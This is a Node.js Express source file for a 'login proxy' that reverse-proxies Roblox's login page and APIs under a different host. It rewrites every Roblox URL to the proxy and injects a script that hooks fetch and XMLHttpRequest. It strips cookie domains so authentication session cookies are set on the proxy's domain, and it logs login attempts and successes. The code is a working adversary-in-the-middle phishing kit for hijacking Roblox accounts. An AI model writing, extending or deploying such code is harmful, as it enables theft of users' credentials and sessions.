const express = require('express');
const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');

const app = express();

console.log('='.repeat(60));
console.log('🔒 PURE LOGIN PROXY - RELAXED COOKIE MODE');
console.log('Attempting to work around cookie domain issues');
console.log('='.repeat(60));

// Domain map
const SUBDOMAIN_MAP = {
    'auth-api':       'https://auth.roblox.com',
    'apis-api':       'https://apis.roblox.com',
    'api-api':        'https://api.roblox.com',
    'economy-api':    'https://economy.roblox.com',
    'users-api':      'https://users.roblox.com',
    'catalog-api':    'https://catalog.roblox.com',
    'games-api':      'https://games.roblox.com',
    'thumbnails-api': 'https://thumbnails.roblox.com',
    'ecsv2-api':      'https://ecsv2.roblox.com',
    'js-cdn':         'https://js.rbxcdn.com',
    'css-cdn':        'https://css.rbxcdn.com',
    'images-cdn':     'https://images.rbxcdn.com',
    'static-cdn':     'https://static.rbxcdn.com',
    'rbxcdn':         'https://www.rbxcdn.com',
    'content-cdn':    'https://content.roblox.com',
};

const CDN_PREFIXES = new Set(['js-cdn', 'css-cdn', 'images-cdn', 'static-cdn', 'rbxcdn', 'content-cdn']);

function buildInjectedScript(host) {
    const domainEntries = Object.entries(SUBDOMAIN_MAP)
        .map(([prefix, target]) => `[${JSON.stringify(target)}, ${JSON.stringify(`https://${host}/${prefix}`)}]`)
        .join(',\n');

    return `<script>
(function() {
    var PROXY_HOST = ${JSON.stringify(`https://${host}`)};
    var DOMAIN_MAP = [
        ${domainEntries},
        ["https://www.roblox.com", PROXY_HOST],
        ["http://www.roblox.com",  PROXY_HOST],
        ["https://roblox.com",     PROXY_HOST],
        ["http://roblox.com",      PROXY_HOST]
    ];

    function rewriteUrl(url) {
        if (!url || typeof url !== 'string') return url;
        for (var i = 0; i < DOMAIN_MAP.length; i++) {
            var from = DOMAIN_MAP[i][0];
            var to   = DOMAIN_MAP[i][1];
            if (url.indexOf(from) === 0) {
                return to + url.slice(from.length);
            }
        }
        return url;
    }

    var _fetch = window.fetch;
    window.fetch = function(resource, init) {
        if (typeof resource === 'string') resource = rewriteUrl(resource);
        else if (resource && resource.url) resource = new Request(rewriteUrl(resource.url), resource);
        return _fetch.call(this, resource, init);
    };

    var _open = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        var args = Array.prototype.slice.call(arguments);
        args[1] = rewriteUrl(url);
        return _open.apply(this, args);
    };

    try {
        var _assign = window.location.assign.bind(window.location);
        window.location.assign = function(url) { _assign(rewriteUrl(url)); };
    } catch(e) {}
})();
</script>`;
}

function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function rewriteUrls(body, host) {
    let result = body;
    for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
        const domain = target.replace(/^https?:/, '');
        result = result.replace(new RegExp(`https?:${escapeRegex(domain)}`, 'g'), `https://${host}/${prefix}`);
        result = result.replace(new RegExp(escapeRegex(domain), 'g'), `//${host}/${prefix}`);
    }
    result = result.replace(/https?:\/\/www\.roblox\.com/g, `https://${host}`);
    result = result.replace(/\/\/www\.roblox\.com/g, `//${host}`);
    result = result.replace(/https?:\/\/roblox\.com/g, `https://${host}`);
    return result;
}

app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
    next();
});

// Auth proxy
app.use('/auth-api', createProxyMiddleware({
    target: 'https://auth.roblox.com',
    changeOrigin: true,
    secure: true,
    cookieDomainRewrite: {
        '.roblox.com': '',
        'roblox.com': '',
        '*': ''
    },
    cookiePathRewrite: {
        '*': '/'
    },
    pathRewrite: { '^/auth-api': '' },
    on: {
        proxyReq: (proxyReq, req) => {
            proxyReq.setHeader('origin', 'https://www.roblox.com');
            proxyReq.setHeader('referer', 'https://www.roblox.com/login');
            
            if (req.headers['user-agent']) {
                proxyReq.setHeader('user-agent', req.headers['user-agent']);
            }
            
            const realIp = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket.remoteAddress;
            if (realIp) {
                proxyReq.setHeader('x-forwarded-for', realIp);
            }
            
            if (req.path === '/v2/login') {
                console.log('🔑 LOGIN ATTEMPT');
            }
        },
        proxyRes: (proxyRes, req) => {
            // Rewrite Set-Cookie headers to work with proxy domain
            const cookies = proxyRes.headers['set-cookie'];
            if (cookies) {
                proxyRes.headers['set-cookie'] = cookies.map(cookie => {
                    return cookie
                        .replace(/Domain=\.?roblox\.com/gi, '')
                        .replace(/Secure;/gi, 'Secure; SameSite=None;');
                });
            }
            
            if (req.path === '/v2/login') {
                console.log(`✅ Login response: ${proxyRes.statusCode}`);
                if (proxyRes.statusCode === 200) {
                    console.log('   🎉 SUCCESS');
                } else {
                    console.log('   ❌ Failed -', proxyRes.statusCode);
                }
            }
        },
        error: (err, req, res) => {
            console.error('[auth-api] Error:', err.message);
            res.status(502).send('Proxy error');
        }
    }
}));

// APIS proxy with cookie handling
app.use('/apis-api', createProxyMiddleware({
    target: 'https://apis.roblox.com',
    changeOrigin: true,
    secure: true,
    cookieDomainRewrite: {
        '.roblox.com': '',
        'roblox.com': '',
        '*': ''
    },
    cookiePathRewrite: {
        '*': '/'
    },
    pathRewrite: { '^/apis-api': '' },
    on: {
        proxyReq: (proxyReq, req) => {
            proxyReq.setHeader('origin', 'https://www.roblox.com');
            proxyReq.setHeader('referer', 'https://www.roblox.com/login');
            if (req.headers['user-agent']) {
                proxyReq.setHeader('user-agent', req.headers['user-agent']);
            }
        },
        proxyRes: (proxyRes, req) => {
            // Rewrite cookies
            const cookies = proxyRes.headers['set-cookie'];
            if (cookies) {
                proxyRes.headers['set-cookie'] = cookies.map(cookie => {
                    return cookie
                        .replace(/Domain=\.?roblox\.com/gi, '')
                        .replace(/Secure;/gi, 'Secure; SameSite=None;');
                });
            }
            
            if (req.path.includes('rotating-client-service') || req.path.includes('challenge')) {
                console.log(`[CHALLENGE] ${req.path} → ${proxyRes.statusCode}`);
            }
        },
        error: (err, req, res) => {
            console.error('[apis-api] Error:', err.message);
            res.status(502).send('Proxy error');
        }
    }
}));

// Other API proxies
for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
    if (prefix === 'auth-api' || prefix === 'apis-api') continue;
    
    const needsRewrite = CDN_PREFIXES.has(prefix);
    
    app.use(`/${prefix}`, createProxyMiddleware({
        target,
        changeOrigin: true,
        secure: true,
        selfHandleResponse: needsRewrite,
        cookieDomainRewrite: '',
        pathRewrite: { [`^/${prefix}`]: '' },
        on: {
            proxyReq: (proxyReq) => {
                proxyReq.setHeader('origin', 'https://www.roblox.com');
                proxyReq.setHeader('referer', 'https://www.roblox.com/login');
                if (needsRewrite) proxyReq.setHeader('accept-encoding', 'gzip, deflate');
            },
            ...(needsRewrite ? {
                proxyRes: responseInterceptor(async (responseBuffer, proxyRes, req) => {
                    const ct = proxyRes.headers['content-type'] || '';
                    if (ct.includes('javascript') || ct.includes('application/json')) {
                        const host = req.headers.host;
                        const original = responseBuffer.toString('utf8');
                        const rewritten = rewriteUrls(original, host);
                        return rewritten;
                    }
                    return responseBuffer;
                })
            } : {}),
            error: (err, req, res) => {
                console.error(`[${prefix}] Error:`, err.message);
                res.status(502).send('Proxy error');
            }
        }
    }));
}

// Main proxy
app.use('/', createProxyMiddleware({
    target: 'https://www.roblox.com',
    changeOrigin: true,
    secure: true,
    selfHandleResponse: true,
    cookieDomainRewrite: '',
    pathRewrite: (path) => (path === '/' || path === '') ? '/login' : path,
    on: {
        proxyReq: (proxyReq) => {
            proxyReq.setHeader('accept-encoding', 'gzip, deflate');
        },
        proxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
            res.setHeader('cache-control', 'no-store, no-cache, must-revalidate');
            res.setHeader('pragma', 'no-cache');

            const ct = proxyRes.headers['content-type'] || '';
            if (ct.includes('text/html') || ct.includes('javascript') || ct.includes('application/json')) {
                const host = req.headers.host;
                let body = responseBuffer.toString('utf8');
                body = rewriteUrls(body, host);

                if (ct.includes('text/html')) {
                    const script = buildInjectedScript(host);
                    body = body.replace('<head', `<head>${script}`);
                    if (!body.includes(script)) {
                        body = script + body;
                    }
                }

                return body;
            }
            return responseBuffer;
        }),
        error: (err, req, res) => {
            console.error('[main] Error:', err.message);
            res.status(502).send('Proxy error');
        }
    }
}));

const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {
    console.log('');
    console.log('='.repeat(60));
    console.log(`✅ Proxy running on port ${PORT}`);
    console.log('⚠️  Note: Cookie domain issues may still occur');
    console.log('💡 Recommendation: Use custom domain for full functionality');
    console.log('='.repeat(60));
    console.log('');
});
